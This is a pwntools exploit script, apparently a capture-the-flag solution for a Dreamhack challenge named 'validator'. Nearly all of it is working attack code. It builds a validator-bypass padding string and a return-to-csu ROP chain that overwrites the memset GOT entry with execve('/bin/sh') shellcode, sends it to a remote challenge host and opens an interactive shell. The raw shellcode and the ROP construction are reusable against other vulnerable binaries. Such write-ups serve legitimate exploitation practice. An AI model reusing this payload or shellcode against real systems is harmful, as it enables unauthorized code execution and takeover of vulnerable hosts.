#!/usr/bin/python3

from pwn import *

def csuPayload(got, rdx, rsi, edi):
    payload = p64(gadget1) + p64(0) + p64(1) + p64(got) + p64(edi) + p64(rsi) + p64(rdx) + p64(gadget2)
    return payload

p = remote("host1.dreamhack.games", 19610)
#p = process("./validator_dist")
e = ELF("./validator_dist")
#context.log_level = 'debug'

gadget1 = 0x00000000004006ea # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget2 = 0x00000000004006d0 # mov rdx, r13; mov rsi, r14; mov edi; r15d; call QWORD PTR [r12+rbx*8]

DH = "DREAMHACK!"
magic = "\x7f\x7e\x7d\x7c\x7b\x7a\x79\x78\x77\x76\x75\x74\x73\x72\x71\x70\x6f\x6e\x6d\x6c\x6b\x6a\x69\x68\x67\x66\x65\x64\x63\x62\x61\x60\x5f\x5e\x5d\x5c\x5b\x5a\x59\x58\x57\x56\x55\x54\x53\x52\x51\x50\x4f\x4e\x4d\x4c\x4b\x4a\x49\x48\x47\x46\x45\x44\x43\x42\x41\x40\x3f\x3e\x3d\x3c\x3b\x3a\x39\x38\x37\x36\x35\x34\x33\x32\x31\x30\x2f\x2e\x2d\x2c\x2b\x2a\x29\x28\x27\x26\x25\x24\x23\x22\x21\x20\x1f\x1e\x1d\x1c\x1b\x1a\x19\x18\x17\x16\x15\x14\x13\x12\x11\x10\x0f\x0e\x0d\x0c\x0b\x0a\x09\x08\x07\x06\x05\x04\x03"

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#1 Write the shellcode on the memset GOT

padding = DH
padding += "A"
padding += magic

payload = padding.encode('utf-8')
payload += csuPayload(e.got['read'], len(shellcode) + 1, e.got['memset'], 0x0)

payload += p64(0) # dummy
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(e.got['memset'])

p.sendline(payload)
sleep(0.5)
p.sendline(shellcode)

p.interactive()
